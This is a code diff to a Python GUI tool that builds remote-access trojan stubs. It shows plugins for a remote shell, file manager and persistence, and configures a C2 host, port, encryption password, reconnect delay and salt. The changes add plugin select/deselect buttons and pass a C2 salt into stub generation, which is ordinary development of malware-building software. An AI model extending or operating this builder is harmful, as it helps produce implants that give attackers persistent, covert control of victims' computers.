@@ -70,6 +70,11 @@ class BuilderApp:
         pf = tk.LabelFrame(main, text="Plugins", bg=DARK_BG, fg=TEXT_FG, font=FONT)
         pf.pack(fill="x", pady=3)
 
+        sel_f = tk.Frame(pf, bg=DARK_BG)
+        sel_f.pack(fill="x", padx=4, pady=1)
+        ttk.Button(sel_f, text="Select All", command=self._select_all).pack(side="left", padx=1)
+        ttk.Button(sel_f, text="Deselect All", command=self._deselect_all).pack(side="left", padx=1)
+
         pinfo = get_info()
         auto = {"shell", "file_manager", "persistence"}
 
@@ -148,6 +153,7 @@ class BuilderApp:
             "password": self._entries["Encryption Password:"].get().strip(),
             "delay": int(self._entries["Reconnect Delay (s):"].get().strip()),
             "onetime": self.var_onetime.get(),
+            "salt_hex": self.config.c2_salt_hex,
         }
 
     def _selected_plugins(self):
@@ -157,7 +163,7 @@ class BuilderApp:
         plugins = self._selected_plugins()
         if not plugins: self.size_label.config(text="Stub size: 0 B (no plugins)"); return
         cfg = self._get_cfg()
-        stub = generate_stub(plugins, cfg["host"], cfg["port"], cfg["password"], cfg["delay"])
+        stub = generate_stub(plugins, cfg["host"], cfg["port"], cfg["password"], cfg["delay"], cfg["salt_hex"])
         size = len(stub.encode("utf-8"))
         kb = size / 1024
         color = GREEN if kb < 50 else ACCENT
@@ -167,7 +173,7 @@ class BuilderApp:
         plugins = self._selected_plugins()
         if not plugins: self._log("[!] Select at least one plugin"); return
         cfg = self._get_cfg()
-        stub = generate_stub(plugins, cfg["host"], cfg["port"], cfg["password"], cfg["delay"])
+        stub = generate_stub(plugins, cfg["host"], cfg["port"], cfg["password"], cfg["delay"], cfg["salt_hex"])
         if cfg["onetime"]: stub = stub.replace("time.sleep(RECONNECT_DELAY)", "# one-shot")
         out_dir = self.output_dir.get(); os.makedirs(out_dir, exist_ok=True)
         out_path = os.path.join(out_dir, "stub.py")
@@ -275,6 +281,12 @@ class BuilderApp:
                 for l in (p.stderr or "").split("\n")[-5:]:
                     if l.strip(): self._log(f"  ERR: {l.strip()}")
         threading.Thread(target=task, daemon=True).start()
+
+    def _select_all(self):
+        for v in self.plugin_vars.values(): v.set(True)
+
+    def _deselect_all(self):
+        for v in self.plugin_vars.values(): v.set(False)
 
     def _start_web(self):
         out_dir = self.output_dir.get()
